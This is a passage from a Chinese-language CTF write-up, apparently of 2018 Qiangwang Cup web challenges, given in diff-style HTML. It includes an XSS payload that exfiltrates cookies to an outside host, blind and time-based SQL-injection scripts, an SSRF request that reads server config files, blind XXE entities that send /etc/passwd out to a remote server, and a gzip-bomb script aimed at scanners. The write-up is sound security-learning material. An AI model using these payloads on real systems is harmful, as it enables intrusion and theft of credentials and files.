+<p>&#x7136;&#x540E;&#x8FD9;&#x91CC;&#x53D1;&#x73B0;&#x5C45;&#x7136;&#x6CA1;&#x6709;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#xFF0C;&#x67E5;&#x770B;&#x6E90;&#x7801;&#x53D1;&#x73B0;&#x662F;&#x8FC7;&#x6EE4;&#x4E86;<code>&quot;</code>&#x548C;<code>&apos;</code>&#xFF0C;&#x7136;&#x540E;&#x6211;&#x5C31;&#x81EA;&#x4F5C;&#x806A;&#x660E;&#x7684;&#x7528;&#x53CD;&#x5F15;&#x53F7;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x5C31;&#x9677;&#x5165;&#x4E86;&#x65E0;&#x5C3D;&#x7684;&#x7384;&#x5B66;&#x9053;&#x8DEF;&#xFF0C;&#x6211;&#x53D1;&#x73B0;&#x672C;&#x5730;&#x6D4F;&#x89C8;&#x5668;&#xFF0C;vsp&#x5C31;&#x53EF;&#x4EE5;&#x6536;&#x5230;&#x8BF7;&#x6C42;</p>
+<p>     <a href="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q6.png" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q6.png" alt="">
+     </a></p>
+<p>&#x4F46;&#x662F;&#x63D0;&#x4EA4;&#x7ED9;bot&#x5C31;&#x6536;&#x4E0D;&#x5230;&#x8BF7;&#x6C42;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x5C31;&#x4E00;&#x76F4;&#x5728;&#x8FD9;&#x91CC;&#x5361;&#x4E86;&#x8D85;&#x7EA7;&#x957F;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x671F;&#x95F4;&#x8FD8;&#x95EE;&#x4E86;&#x51FA;&#x9898;&#x4EBA;,bot&#x7B49;&#x95EE;&#x9898;&#x2026;&#x76F4;&#x5230;&#x665A;&#x4E0A;&#x7528;<code>String.fromCharCode</code>&#x624D;&#x89E3;&#x51B3;&#x4E86;&#x8FD9;&#x4E2A;&#x7384;&#x5B66;&#x95EE;&#x9898;(&#x8FD9;&#x4E2A;&#x70B9;&#x771F;&#x5FC3;&#x5361;&#x4E86;&#x6211;&#x597D;&#x4E45;),&#x540E;&#x9762;&#x5C31;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x4E86;&#x6536;&#x5230;&#x8BF7;&#x6C42;&#x540E;&#x53D1;&#x73B0;cookie&#x6709;&#x63D0;&#x793A;</p>
+<p>&#x8054;&#x60F3;&#x5230;&#x56FD;&#x8D5B;&#x7684;&#x4E00;&#x9053;&#x8BFB;&#x53D6;&#x5B50;&#x76EE;&#x5F55;cookie&#x7684;&#x9898;&#x76EE;</p>
+<blockquote>
+<p><a href="https://www.lorexxar.cn/2017/07/11/guosai2017/" target="_blank">https://www.lorexxar.cn/2017/07/11/guosai2017/</a></p>
+</blockquote>
+<p>&#x811A;&#x672C;&#x62FF;&#x6765;&#x6539;&#x4E86;&#x6539;&#x5C31;&#x53EF;&#x4EE5;get&#x5B50;&#x76EE;&#x5F55;cookie&#x4E86;</p>
+<pre><code>var iframe = document.createElement(&quot;iframe&quot;);
+iframe.src = &quot;/QWB_f14g/QWB&quot;;
+iframe.id = &quot;frame&quot;;
+document.body.appendChild(iframe);
+iframe.onload = function (){
+      var c = document.getElementById(&apos;frame&apos;).contentWindow.document.cookie;
+    var n0t = document.createElement(&quot;link&quot;);
+    n0t.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);
+    n0t.setAttribute(&quot;href&quot;, &quot;//xxx/?&quot; + c);
+    document.head.appendChild(n0t);
+}
+</code></pre><p>&#x7136;&#x540E;&#x628A;&#x6240;&#x6709;&#x5F15;&#x53F7;&#x4E4B;&#x95F4;&#x7684;&#x5185;&#x5BB9;&#x7528;String.fromcode()&#x7F16;&#x7801;&#x4E00;&#x4E0B;</p>
+<p>     <a href="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q7.PNG" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q7.PNG" alt="">
+     </a></p>
+<h3 id="three-hit"><a name="three-hit" class="anchor-navigation-ex-anchor" href="#three-hit"><i class="fa fa-link" aria-hidden="true"></i></a>4.1.3. Three hit</h3>
+<p>&#x8FDB;&#x53BB;&#x540E;&#x53D1;&#x73B0;&#x529F;&#x80FD;&#x5F88;&#x5C11;&#xFF0C;&#x731C;&#x6D4B;&#x4E8C;&#x6B21;&#x6CE8;&#x5165;&#xFF0C;&#x53D1;&#x73B0;username&#x6709;&#x6B63;&#x5219;&#x9650;&#x5236;&#xFF0C;&#x90A3;&#x4E48;&#x6D4B;&#x8BD5;age&#xFF0C;&#x53D1;&#x73B0;&#x5FC5;&#x987B;&#x6574;&#x6570;&#xFF0C;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x7528;16&#x8FDB;&#x5236;&#x7ED5;&#x8FC7;&#xFF0C;&#x6D4B;&#x8BD5;&#x4E00;&#x756A;&#x540E;&#x53D1;&#x73B0;&#x662F;&#x4E2A;&#x76F2;&#x6CE8;</p>
+<p>     <a href="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q3.PNG" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q3.PNG" alt="">
+     </a></p>
+<p>     <a href="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q.PNG" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q.PNG" alt="">
+     </a></p>
+<p>     <a href="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q1.PNG" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q1.PNG" alt="">
+     </a></p>
+<p>&#x627E;&#x4E86;&#x4E2A;&#x811A;&#x672C;&#x6539;&#x4E86;&#x4E0B;</p>
+<pre><code>import requests
+import binascii
+
+url_register = &quot;http://39.107.32.29:10000/index.php?func=register&quot;
+url_login = &quot;http://39.107.32.29:10000/index.php?func=login&quot;
+result = &apos;[*]result:&apos;
+for i in range(1, 65):
+    for j in range(32, 127):
+        age = &quot;1223 or ascii(substr((select flag from flag limit 1),{0},1))={1}#&quot;.format(str(i), str(j))
+        age = binascii.hexlify(bytes(age, &apos;utf8&apos;))
+        age = &quot;0x&quot; + str(age, &quot;utf8&quot;)
+        username = &quot;pupiles{0}{1}&quot;.format(str(i), str(j))
+        data = {
+            &quot;username&quot;: username,
+            &quot;password&quot;: &quot;123456&quot;,
+            &quot;age&quot;: age
+        }
+        while True:
+            try:
+                resp1 = requests.post(url=url_register, data=data, allow_redirects=False)
+                break
+            except Exception as e:
+                continue
+        while True:
+            try:
+                resp2 = requests.post(url=url_login, data=data, allow_redirects=True)
+                if &quot;&lt;a&gt;123&lt;/a&gt;&quot; in resp2.text:
+                    result += chr(j)
+                    print(result)
+                break
+            except Exception as e:
+                continue
+</code></pre><p>&#x76F2;&#x6CE8;&#x8DD1;&#x51FA;flag</p>
+<h3 id="wechat"><a name="wechat" class="anchor-navigation-ex-anchor" href="#wechat"><i class="fa fa-link" aria-hidden="true"></i></a>4.1.4. Wechat</h3>
+<p>     <a href="https://p2.ssl.qhimg.com/t011aefb72d68b8727e.jpg" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://p2.ssl.qhimg.com/t011aefb72d68b8727e.jpg" alt="">
+     </a></p>
+<p>&#x51FA;&#x9898;&#x4EBA;&#x7ED9;&#x51FA;&#x4E86;&#x516C;&#x4F17;&#x540E;&#x540E;&#x9762;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x67E5;&#x770B;&#x5FAE;&#x4FE1;&#x516C;&#x4F17;&#x53F7;&#x7684;SDK&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E00;&#x4E9B;xml&#x6570;&#x636E;&#x8FDB;&#x884C;&#x53D1;&#x9001;</p>
+<pre><code>import requests
+
+url = &quot;http://39.107.33.77/&quot;
+content = &quot;Test http://www.baidu.com TEAMKEY icq3be93d38562e68bc0a86368c2d6b2&quot;
+
+data = &apos;&apos;&apos;
+&lt;xml&gt;
+   &lt;ToUserName&gt;&lt;![CDATA[a]]&gt;&lt;/ToUserName&gt;
+   &lt;FromUserName&gt;&lt;![CDATA[1&apos;,(select content from note limit 3,1))--]]&gt;&lt;/FromUserName&gt; 
+   &lt;CreateTime&gt;1348831860&lt;/CreateTime&gt;
+   &lt;MsgType&gt;&lt;![CDATA[text]]&gt;&lt;/MsgType&gt;
+   &lt;Content&gt;&lt;![CDATA[%s]]&gt;&lt;/Content&gt;
+   &lt;MsgId&gt;1234567890123456&lt;/MsgId&gt;
+   &lt;AgentID&gt;1&lt;/AgentID&gt;
+&lt;/xml&gt;
+&apos;&apos;&apos; % content
+
+print requests.post(url,data=data).content
+</code></pre><p>&#x901A;&#x8FC7;&#x63D0;&#x793A;&#x5B58;&#x5728;&#x6CE8;&#x5165;&#xFF0C;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4EE5;&#x4E0B;&#x4FE1;&#x606F;</p>
+<pre><code>&lt;xml&gt;
+&lt;ToUserName&gt;&lt;![CDATA[1&apos;,(select content from note limit 3,1))--]]&gt;&lt;/ToUserName&gt;
+&lt;FromUserName&gt;&lt;![CDATA[a]]&gt;&lt;/FromUserName&gt;
+&lt;CreateTime&gt;1521882365&lt;/CreateTime&gt;
+&lt;MsgType&gt;&lt;![CDATA[text]]&gt;&lt;/MsgType&gt;
+&lt;Content&gt;&lt;![CDATA[Success!
+Start Time:You can leave me message here: http://wc.qwb.com:8088/leave_message.php 
+Over Time:Sat Mar 24 09:06:05 2018]]&gt;&lt;/Content&gt;
+&lt;MsgId&gt;1234567890123456&lt;/MsgId&gt;
+&lt;/xml&gt;
+</code></pre><p>&#x7ED1;&#x5B9A;host: <code>wc.qwb.com</code> &#x7684;ip&#x4E3A;<code>39.107.33.77</code></p>
+<p>     <a href="https://p2.ssl.qhimg.com/t01829699aaeba7d22b.jpg" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://p2.ssl.qhimg.com/t01829699aaeba7d22b.jpg" alt="">
+     </a></p>
+<p>&#x5176;&#x4E2D;message&#x5B58;&#x5728;&#x6CE8;&#x5165;&#xFF0C;&#x9650;&#x5236;&#x7684;&#x6BD4;&#x8F83;&#x4E25;&#x683C;</p>
+<pre><code>POST /leave_message.php HTTP/1.1
+Host: wc.qwb.com:8088
+
+user=aaaaaaaaaaaaaaa&amp;email=aaaa@qq.com&amp;team=icq3be93d38562e68bc0a86368c2d6b2&amp;message=1&apos;-(sleep(ceil(pi())))-&apos;1&amp;submit=submit
+</code></pre><p>     <a href="https://p3.ssl.qhimg.com/t01f606eef4a3121817.jpg" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://p3.ssl.qhimg.com/t01f606eef4a3121817.jpg" alt="">
+     </a></p>
+<p>&#x6BD4;&#x5982;sleep&#x51FD;&#x6570;&#x53C2;&#x6570;&#x91CC;&#x9762;&#x4E0D;&#x80FD;&#x7528;&#x6570;&#x5B57;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>pi()</code>&#x6765;&#x7ED5;&#x8FC7;&#xFF0C;&#x53E6;&#x5916;&#x5C31;&#x662F;<code>select from</code>&#x90E8;&#x5206;&#x3002;</p>
+<pre><code>message=12333&apos;-(if(ascii(substring((select@b:=group_concat(username)from{cl0und.adminuser}),%s,1))like&apos;%s&apos;,sleep(pi()),0))-&apos;1
+</code></pre><p>&#x8FD9;&#x91CC;&#x5B57;&#x6BB5;&#x90FD;&#x9700;&#x8981;&#x731C;&#x89E3;&#xFF0C;&#x731C;&#x4E0D;&#x5230;password&#x5B57;&#x6BB5;</p>
+<p><code>http://wc.qwb.com:8088/forgetpassword.php</code></p>
+<p>&#x5229;&#x7528;&#x5BC6;&#x7801;&#x627E;&#x56DE;&#x529F;&#x80FD;&#xFF0C;&#x6CE8;&#x5165;&#x51FA;code&#xFF0C;&#x627E;&#x56DE;&#x7BA1;&#x7406;&#x5458;&#x5BC6;&#x7801;</p>
+<p>&#x8FDB;&#x5165;&#x540E;&#x53F0;&#x540E;&#xFF0C;&#x53D1;&#x73B0;&#x6709;&#x4E00;&#x6BB5;&#x4E0A;&#x4F20;&#x5904;&#xFF0C;&#x4E3B;&#x8981;&#x7528;&#x4E8E;&#x7528;&#x6237;&#x7684;&#x5934;&#x50CF;&#x4E0A;&#x4F20;&#x3002;</p>
+<p>&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x540E;&#x4FBF;&#x4F1A;&#x5C06;&#x56FE;&#x7247;&#x7684;&#x5185;&#x5BB9;&#x663E;&#x793A;&#x51FA;&#x6765;&#x3002;</p>
+<p>     <a href="https://p0.ssl.qhimg.com/t0190dec4b486262a3d.jpg" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://p0.ssl.qhimg.com/t0190dec4b486262a3d.jpg" alt="">
+     </a></p>
+<p>&#x518D;&#x5F80;&#x540E;&#x9762;&#x770B;htm&#x4E2D;&#x6709;&#x4E00;&#x6BB5;&#x6CE8;&#x91CA;&#x3002;</p>
+<p>     <a href="https://p1.ssl.qhimg.com/t01055a23cacad864af.jpg" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://p1.ssl.qhimg.com/t01055a23cacad864af.jpg" alt="">
+     </a></p>
+<p>&#x5176;&#x4E2D;urlink&#x5B58;&#x5728;ssrf&#x6F0F;&#x6D1E;&#xFF0C;&#x6CA1;&#x6709;&#x9650;&#x5236;&#x534F;&#x8BAE;&#x4EE5;&#x53CA;&#x540E;&#x9762;&#x7684;&#x5B57;&#x7B26;&#xFF0C;&#x5F53;&#x7136;&#x5927;&#x90E8;&#x5206;&#x7684;&#x7279;&#x6B8A;&#x7B26;&#x53F7;&#x4E0D;&#x80FD;&#x7528;&#xFF0C;&#x53EA;&#x80FD;&#x8BFB;&#x53D6;&#x4E00;&#x4E9B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;</p>
+<pre><code>POST /getimg.php HTTP/1.1
+Host: wc.qwb.com:8088
+Cookie: PHPSESSID=cjq7naar02kajivdftljhj2h44
+
+------WebKitFormBoundaryOXFwabnsGhrKdxyn
+Content-Disposition: form-data; name=&quot;urlink&quot;
+
+file://wc.qwb.com:8088/etc/apache2/apache2.conf
+------WebKitFormBoundaryOXFwabnsGhrKdxyn--
+</code></pre><p>&#x8BFB;&#x53D6;&#x5230;apache&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5185;&#x5BB9;&#x3002;&#x5F88;&#x90C1;&#x95F7;&#xFF0C;&#x6BD4;&#x8D5B;&#x7684;&#x65F6;&#x5019;&#x8BFB;&#x53D6;&#x4E86;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x4F46;&#x662F;base64&#x7684;&#x5185;&#x5BB9;&#x6CA1;&#x53D6;&#x5B8C;&#x6574;&#x5BFC;&#x81F4;&#x6CA1;&#x770B;&#x5230;&#x8FD9;&#x90E8;&#x5206;&#xFF0C;&#x8FD8;&#x662F;&#x9700;&#x8981;&#x7EC6;&#x5FC3;&#x2026;</p>
+<pre><code>#&lt;Directory /home/qwbweb/backdoor&gt;
+#       Port    23333
+#   Options Indexes FollowSymLinks
+#   AllowOverride None
+#   Require all granted
+#   Here is a Bin with its libc
+#&lt;/Directory&gt;
+</code></pre><p>&#x5269;&#x4E0B;&#x7684;&#x5C31;&#x662F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;pwn&#x7A0B;&#x5E8F;&#xFF0C;&#x7136;&#x540E;pwnpwnpwn&#x4E86;&#xFF0C;&#x592A;&#x83DC;&#x4E86;&#xFF0C;&#x4E0D;&#x4F1A;&#x505A;&#x3002;</p>
+<h3 id="&#x6559;&#x80B2;&#x673A;&#x6784;"><a name="&#x6559;&#x80B2;&#x673A;&#x6784;" class="anchor-navigation-ex-anchor" href="#&#x6559;&#x80B2;&#x673A;&#x6784;"><i class="fa fa-link" aria-hidden="true"></i></a>4.1.5. &#x6559;&#x80B2;&#x673A;&#x6784;</h3>
+<p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x5176;&#x5B9E;&#x7279;&#x522B;&#x61F5;&#x903C;&#xFF0C;&#x7ED9;&#x4E86;&#x4E00;&#x4E2A;&#x57DF;&#x540D;&#xFF0C;&#x8FD8;&#x4EE5;&#x4E3A;&#x662F;&#x8981;&#x6765;&#x4E00;&#x573A;&#x771F;&#x5B9E;&#x73AF;&#x5883;&#x6E17;&#x900F;&#x9898;&#xFF0C;&#x6240;&#x4EE5;&#x4FE1;&#x606F;&#x6536;&#x96C6;&#x65B9;&#x9762;&#x90FD;&#x505A;&#x4E86;&#x3002;&#x6BD4;&#x5982;&#x626B;&#x4E8C;&#x7EA7;&#x57DF;&#x540D;&#xFF0C;&#x626B;&#x7AEF;&#x53E3;&#xFF0C;&#x626B;&#x6587;&#x4EF6;(&#x4E00;&#x626B;&#x5C31;&#x88AB;ban)</p>
+<p>80&#x7AEF;&#x53E3;&#x770B;&#x7684;&#x5B9E;&#x5728;&#x61F5;&#x903C;&#xFF0C;&#x6BEB;&#x65E0;&#x5934;&#x7EEA;&#x3002;&#x5C31;&#x770B;&#x4E86;&#x4E00;&#x4E0B;33899&#x7AEF;&#x53E3;&#x7684;&#x4E1C;&#x897F;&#xFF0C;&#x6709;&#x4E00;&#x4E2A;.idea&#x7684;&#x6CC4;&#x9732;&#xFF0C;&#x4F46;&#x662F;&#x5E76;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x7528;&#x3002;</p>
+<p><code>http://39.107.33.75:33899/.idea/workspace.xml</code></p>
+<p>&#x5185;&#x5BB9;&#x88AB;&#x6CE8;&#x91CA;&#x4E86;&#x4E00;&#x6BB5;xm&#x8C03;&#x7528;&#x5B9E;&#x4F53;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x6709;&#x70B9;&#x60F3;xxe&#x3002;</p>
+<p>&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x5730;&#x65B9;&#x5C31;&#x662F;&#x63D0;&#x4EA4;&#x8BC4;&#x8BBA;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x4F46;&#x662F;&#x65E0;&#x8BBA;&#x600E;&#x4E48;&#x6837;&#x5199;&#x5165;&#x90FD;&#x662F;<code>alert(&quot;&#x672A;&#x77E5;&#x9519;&#x8BEF;&#xFF01;&#xFF01;&#xFF01;&#x8BF7;&#x91CD;&#x8BD5;&quot;)</code></p>
+<p>     <a href="https://p2.ssl.qhimg.com/t0186a7cd8b694eadb0.jpg" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://p2.ssl.qhimg.com/t0186a7cd8b694eadb0.jpg" alt="">
+     </a></p>
+<p>&#x4F20;&#x5165;&#x6570;&#x7EC4;&#x7684;&#x65F6;&#x5019;&#x53D1;&#x73B0;&#x51FA;&#x73B0;&#x95EE;&#x9898;&#x4E86;&#x3002;</p>
+<p>     <a href="https://p0.ssl.qhimg.com/t012128c603810b90b1.jpg" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://p0.ssl.qhimg.com/t012128c603810b90b1.jpg" alt="">
+     </a></p>
+<p>comment&#x5904;&#x6709;&#x88AB;userdecode&#x5904;&#x7406;&#x8FC7;&#xFF0C;&#x8BD5;&#x4E00;&#x4E0B;xml&#x5934;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x62A5;&#x9519;&#xFF0C;&#x8003;&#x70B9;&#x5E94;&#x8BE5;&#x5C31;&#x662F;xxe&#x3002;</p>
+<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code></p>
+<p>     <a href="https://p5.ssl.qhimg.com/t01933a8569390d8a27.jpg" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://p5.ssl.qhimg.com/t01933a8569390d8a27.jpg" alt="">
+     </a></p>
+<p>&#x901A;&#x8FC7;&#x76F2;xxe&#xFF0C;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5230;&#x6587;&#x4EF6;&#x3002;</p>
+<p>&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#x5E03;&#x7F6E;&#x4E00;&#x4E2A;1.xml</p>
+<pre><code>&lt;!ENTITY % payload SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;http://ip/test/?xxe_local=%payload;&apos;&gt;&quot;&gt;
+%int;
+%trick;
+</code></pre><p>comment&#x518D;&#x8FDB;&#x884C;&#x8C03;&#x7528;</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://ip/xxe/1.xml&quot;&gt; %remote; ]&gt;&lt;/root&gt;
+</code></pre><p>&#x83B7;&#x53D6;&#x4E00;&#x4E0B;<code>/var/www/52dandan.cc/public_html/config.php</code></p>
+<pre><code>&lt;?php
+define(BASEDIR, &quot;/var/www/52dandan.club/&quot;);
+define(FLAG_SIG, 1);
+define(SECRETFILE,&apos;/var/www/52dandan.com/public_html/youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431&apos;);
+....
+?&gt;
+</code></pre><p>&#x62FF;&#x5230;&#x4E86;&#x4E00;&#x534A;&#x7684;flag</p>
+<pre><code>Ok,you get the first part of flag : 5bdd3b0ba1fcb40
+then you can do more to get more part of flag
+</code></pre><p>&#x8FD9;&#x91CC;&#x51FA;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5C31;&#x662F;&#x83B7;&#x53D6;<code>/var/www/52dandan.cc/public_html/common.php</code>&#x7684;&#x65F6;&#x5019;&#x51FA;&#x73B0;&#x4E86;Detected an entity reference loop&#x9519;&#x8BEF;&#x3002;</p>
+<p>     <a href="https://p3.ssl.qhimg.com/t019552d837e8c8502c.jpg" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://p3.ssl.qhimg.com/t019552d837e8c8502c.jpg" alt="">
+     </a></p>
+<p>&#x67E5;&#x4E86;&#x4E00;&#x4E0B;&#x8D44;&#x6599;&#xFF0C;libxml&#x89E3;&#x6790;&#x5668;&#x9ED8;&#x8BA4;&#x9650;&#x5236;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x957F;&#x5EA6;&#x4E3A;2k&#xFF0C;&#x6CA1;&#x6CD5;&#x7A81;&#x7834;&#xFF0C;&#x53EA;&#x80FD;&#x5BFB;&#x627E;&#x4E00;&#x4E0B;&#x538B;&#x7F29;&#x6570;&#x636E;&#x65B9;&#x9762;&#x7684;&#x3002;php&#x8FC7;&#x6EE4;&#x5668;&#x4E2D;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E2A;zlib.inflate&#x538B;&#x7F29;&#x6570;&#x636E;&#x3002;</p>
+<pre><code>&#x538B;&#x7F29;&#xFF1A;echo file_get_contents(&quot;php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&quot;);
+&#x89E3;&#x538B;&#xFF1A;echo file_get_contents(&quot;php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1&quot;);
+</code></pre><p>&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5230;common.php&#x6587;&#x4EF6;&#x6E90;&#x7801;&#x4E86;!</p>
+<p>     <a href="https://p3.ssl.qhimg.com/t01f696f6826e2c62f8.jpg" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://p3.ssl.qhimg.com/t01f696f6826e2c62f8.jpg" alt="">
+     </a></p>
+<p>&#x518D;&#x83B7;&#x53D6;&#x4E00;&#x4E0B;&#x673A;&#x5668;&#x7684;&#x4E00;&#x4E9B;ip&#x4FE1;&#x606F;&#xFF0C;&#x5176;&#x4E2D;arp&#x4FE1;&#x606F;&#x4E2D;&#x4FDD;&#x7559;&#x4E86;&#x4E00;&#x4E2A;&#x5185;&#x7F51;&#x5730;&#x5740;</p>
+<pre><code>/proc/net/arp
+/etc/host
+</code></pre><pre><code>IP address       HW type     Flags       HW address            Mask     Device
+192.168.223.18   0x1         0x2         02:42:c0:a8:df:12     *        eth0
+192.168.223.1    0x1         0x2         02:42:91:f9:c9:d4     *        eth0
+</code></pre><p>&#x5F00;&#x653E;&#x4E86;&#x4E00;&#x4E2A;80&#x7AEF;&#x53E3;&#xFF0C;test.php&#x7684;shop&#x53C2;&#x6570;&#x5B58;&#x5728;&#x6CE8;&#x5165;</p>
+<pre><code>&lt;!ENTITY % payload     SYSTEM     &quot;http://192.168.223.18/test.php?shop=3&apos;-(case%a0when((1)like(1))then(0)else(1)end)-&apos;1&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;http://ip/test/?xxe_local=%payload;&apos;&gt;&quot;&gt;
+%int;
+%trick;
+</code></pre><p>&#x505A;&#x4E0D;&#x52A8;&#x4E86;&#xFF0C;&#x4E0D;&#x60F3;&#x505A;&#x4E86;&#x3002;</p>
+<p>2333&#xFF0C;&#x5B66;&#x4E60;&#x4E86;&#x4E00;&#x4E2A;&#x9632;&#x6B62;&#x626B;&#x63CF;&#x5668;&#x7684;&#x59FF;&#x52BF;&#xFF0C;&#x5982;&#x679C;&#x626B;&#x63CF;&#x5668;&#x722C;&#x5230;test.php&#xFF0C;&#x5F53;&#x7136;&#x5BF9;&#x4E00;&#x822C;&#x7684;&#x76EE;&#x5F55;&#x626B;&#x63CF;&#x6548;&#x679C;&#x4E0D;&#x5927;&#xFF0C;&#x4E00;&#x822C;&#x90FD;&#x662F;HEAD&#x8BF7;&#x6C42;&#x3002;</p>
+<p>test.php</p>
+<pre><code>&lt;?php
+$agent = strtolower($_SERVER[&apos;HTTP_USER_AGENT&apos;]);
+//check for nikto, sql map or &quot;bad&quot; subfolders which only exist on wordpress
+if (strpos($agent, &apos;nikto&apos;) !== false || strpos($agent, &apos;sqlmap&apos;) !== false || startswith($url,&apos;wp-&apos;) || startswith($url,&apos;wordpress&apos;) || startswith($url,&apos;wp/&apos;))
+{
+    sendBomb();
+    exit();
+}
+function sendBomb(){
+    //prepare the client to recieve GZIP data. This will not be suspicious
+    //since most web servers use GZIP by default
+    header(&quot;Content-Encoding: gzip&quot;);
+    header(&quot;Content-Length: &quot;.filesize(&apos;www.gzip&apos;));
+    //Turn off output buffering
+    if (ob_get_level()) ob_end_clean();
+    //send the gzipped file to the client
+    readfile(&apos;10G.gzip&apos;);
+}
+function startsWith($haystack,$needle){
+    return (substr($haystack,0,strlen($needle)) === $needle);
+}
+?&gt;
+</code></pre><p>know it then do it</p>
+<p>Python is the best language 1/2</p>
+<pre><code>http://39.107.32.29:20000
+
+http://117.50.16.51:20000
+
+&#x4E0B;&#x8F7D;&#x5730;&#x5740;
+&#x5907;&#x7528;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF08;&#x5BC6;&#x7801;&#xFF1A;rtou&#xFF09;
+
+I&apos;m learning the flask recently,and I think python is the best language in the world!don&apos;t you think so?
+</code></pre><h3 id="python-is-the-best-language"><a name="python-is-the-best-language" class="anchor-navigation-ex-anchor" href="#python-is-the-best-language"><i class="fa fa-link" aria-hidden="true"></i></a>4.1.6. Python is the best language</h3>
+<h4 id="&#x89E3;&#x6CD5;&#x4E00;"><a name="&#x89E3;&#x6CD5;&#x4E00;" class="anchor-navigation-ex-anchor" href="#&#x89E3;&#x6CD5;&#x4E00;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x89E3;&#x6CD5;&#x4E00;" class="plugin-anchor" href="#&#x89E3;&#x6CD5;&#x4E00;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x89E3;&#x6CD5;&#x4E00;</h4>
+<p>&#x6E90;&#x7801;&#x4E0B;&#x8F7D;&#x4E0B;&#x6765;&#x540E;&#xFF0C;&#x7531;&#x4E8E;&#x662F;&#x57FA;&#x4E8E;flask&#x6846;&#x67B6;&#xFF0C;&#x56E0;&#x6B64;&#x5148;&#x770B;&#x4E86;&#x770B;&#x8DEF;&#x7531;&#x6587;&#x4EF6;<code>routes.py</code>&#xFF0C;&#x5927;&#x6982;&#x5982;&#x4E0B;&#xFF1A;</p>
+<pre><code>@app.before_request
+def before_request():
+
+@app.teardown_request
+def shutdown_session(exception=None):
+
+@app.route(&apos;/&apos;, methods=\[&apos;GET&apos;, &apos;POST&apos;\])
+@app.route(&apos;/index&apos;, methods=\[&apos;GET&apos;, &apos;POST&apos;\])
+@login_required
+def index():
+
+@app.route(&apos;/explore&apos;)
+@login_required
+def explore():
+
+@app.route(&apos;/logout&apos;)
+def logout():
+
+@app.route(&apos;/register&apos;, methods=\[&apos;GET&apos;, &apos;POST&apos;\])
+def register():
+
+@app.route(&apos;/user/&lt;username&gt;&apos;)
+@login_required
+def user(username):
+
+@app.route(&apos;/edit_profile&apos;, methods=\[&apos;GET&apos;, &apos;POST&apos;\])
+@login_required
+def edit_profile():
+
+@app.route(&apos;/follow/&lt;username&gt;&apos;)
+@login_required
+def follow(username):
+
+@app.route(&apos;/unfollow/&lt;username&gt;&apos;)
+@login_required
+def unfollow(username):
